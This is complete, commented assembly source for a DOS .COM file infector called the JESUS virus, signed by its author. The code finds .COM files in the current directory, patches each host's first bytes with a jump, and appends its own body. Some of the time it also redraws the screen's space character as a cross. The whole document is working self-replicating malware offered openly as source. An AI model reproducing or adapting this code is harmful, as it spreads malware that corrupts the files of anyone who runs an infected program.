; This is the source code for the JESUS virus.  It is a .COM file
; infector, which will change the space character, on an EGA or VGA,
; into a cross 10% of the time.  It infects only one file per run in
; the current directory.
; By Captain Zero
; Note: I can be reached on the MiSS BBS


jesus   segment
assume  cs:jesus,ds:jesus,ss:jesus,es:jesus
org     100h

; This is so the virus knows not to infect itself.
beginning:
        db      0e9h                    ; Near Jump
        dw      0                       ; To virtop (next place)
                                        ; This will also make sure JESUS
                                        ; knows that this particular
                                        ; file is infected.

; Note - the above is not written to the file to infect.  Below
; until virend is written.

; This tells the virus where it is in memory, which is
; different for each file that's infected.
virtop:
        call    change
change:
        pop     bp                      ; Get where we are
        sub     bp,offset change        ; Find the offset for
                                        ; our data.

; Put the origional top 3 bytes to the host program
        mov     di,100h                 ; Destination (top of host)
        lea     si,[bp+offset first_3]  ; Load the address of the
                                        ; origional first 3 bytes

; Save 100h for a RET later.  (to the top of the file)
        push    di
        movsb                           ; Do the moving
        movsw                           ; The other 2

; Change the DTA to an alternate place, so we don't screw
; the command lines of the called program.
        lea     dx,[bp+offset newdta]   ; The address of the new DTA
        call    changedta               ; Make it the DTA

; This is the routine to find a file
        xor     cx,cx                   ; Clear the attribute mask
        mov     ah,4eh                  ; Find first
        lea     dx,[bp+commask]         ; search for *.com
tryagain:
        int     21h                     ; Call DOS
        jc      quit                    ; If there's a problem, bail

; Open the file for both read AND write access.  If the file is read
; only, it won't be able to do it.  Oh well.
        mov     ax,3d02h                ; Open for read/write
        lea     dx,[bp+offset newdta+30] ; The filename of what
                                        ; find first or find next got
                                        ; is kept in the current DTA at
                                        ; an offset of 30.
        int     21h                     ; Call DOS
        mov     bx,ax                   ; we want BX=filehandle now

; Get the first three bytes of the file we found
        mov     ah,3fh                  ; Read
        lea     dx,[bp+first_3]         ; Where to put read data
        mov     cx,03                   ; How many bytes? 3!
        int     21h                     ; Call DOS

; Check to see if the file has already been infected
        mov     cx,word ptr [bp+first_3+1] ; Where it jumps too (that
                                        ; is assuming it's really a
                                        ; jump address, which it may
                                        ; not be if the file's not
                                        ; infected).  In an infected
                                        ; file, this should be equal
                                        ; to the total filesize - the
                                        ; virus size.  Else, it's just
                                        ; 'garbage'.
        mov     ax,word ptr [bp+newdta+26] ; Size of the file we
                                        ; found (the WHOLE thing,
                                        ; including virus, if infected)
        add     cx,virend-virtop+3      ; Take the place it jumps to,
                                        ; and add the size of the virus.
        cmp     cx,ax                   ; Is the jumplace+virusize (cx) the
                                        ; same as the file's total size (ax)?
        je      closefile               ; If so, forget this file!

; If the file's NOT infected ....
        sub     ax,3                    ; Find offset of jmp
        mov     word ptr [bp+scratch],ax ; Put the offset right after
                                        ; the JMP code in memory.

; Return to the top of the file
        sub     al,al                   ; 0 = top
        call    fptr                    ; Move the file pointer

; Write three new bytes to the top of the file (the jump)
        mov     cx,03                   ; Three bytes
        mov     ah,40h                  ; Write
        lea     dx, [bp+jumpcode]       ; Where to read from
        int     21h                     ; Write to file

; Now move to the end of the file to infect
        mov     al,02                   ; 2 = end
        call    fptr                    ; Move the file pointer

; Append the viral code to the host
        mov     ah,40h                  ; Write
        mov     cx, virend-virtop       ; Size of written portion (in
                                        ; bytes)
        lea     dx, [bp+virtop]         ; Start at the start
        int     21h                     ; Call DOS

; Now leave
        jmp     closefinal

; This is where we go when we find a file we can't infect
closefile:
        mov     ah,3eh                  ; Close
        int     21h                     ; Call DOS

; Hey, we gotta try again, don't we?
        mov     ah,4fh                  ; But this time use Find NEXT
        jmp     tryagain                ; Go for it

; This is when we've either infected a file, or there's nothing left to
; infect
closefinal:
        mov     ah,3eh                  ; Close
        int     21h                     ; Call DOS

; This is after everything's done.  We'll see if we should activate
; now.  And then we'll fix the DTA and return to the host.
quit:
        mov     ah,2ch                  ; Find the time
        int     21h                     ; Call DOS
        cmp     dl,10                   ; Are the 100ths of seconds less
                                        ; than 10? (10% chance)
        jb      domess                  ; If so, do your duty!

; This is just so that domess knows where to come back to
back:
        mov     dx,80h                  ; Where the origional DTA was

; This moves the DTA.
changedta:
        mov     ah,1ah                  ; Change DTA
        int     21h                     ; Call DOS
        retn                            ; Return to caller.  If there
                                        ; is no caller (as there is when
                                        ; this place is reached through
                                        ; 'back'), it will go to the
                                        ; address put on di, which was
                                        ; 100h - this is the effective
                                        ; end.

; This is the religous experience :)
domess:
        mov     ax,1100h                ; Change characters on EGA/VGA
        mov     bx,0e00h                ; Number of rows in character
        mov     cx,01                   ; Number of characters to change
        mov     dx,20h                  ; Character to molest (' ')
        lea     bp,[bp+tablex]          ; Load address of bit table.  We
                                        ; won't be needing BP anymore,
                                        ; anyway, so we can screw it up
                                        ; here.
        int     10h                     ; Call VIDEO
        jmp     back                    ; Go back to set the DTA and
                                        ; bail
; This moves the file pointer.  Wow
fptr:
        xor     cx,cx                   ; CX = 0
        cwd                             ; Shortcut for DX = 0
        mov     ah,42h                  ; Move file pointer
        int     21h                     ; Call DOS
        retn                            ; Return to caller

; This is the bitmap for the cross
tablex  db      00011100b
        db      00010100b
        db      00010100b
        db      01110111b
        db      01000001b
        db      01110111b
        db      00010100b
        db      00010100b
        db      00010100b
        db      00010100b
        db      00010100b
        db      00010100b
        db      00010100b
        db      00011100b

        db      'Jesus Hates You'       ; Just an ID ... :)

commask db      '*.cOm',0       ; Mask for com files

first_3 db      0CDh,20h,0      ; Origional first three bytes.  Holds
                                ; a terminate now, but it will change
                                ; when a file is infected

jumpcode db     0E9h            ; This is a jump code

virend  equ     $               ; This is the end of what is written

; This is just for holding stuff in memory.  It's not written.
scratch dw      ?               ; Holds jump address

newdta  db      42 dup (?)      ; The area to hold the temp DTA

jesus   ENDS
        END     beginning
        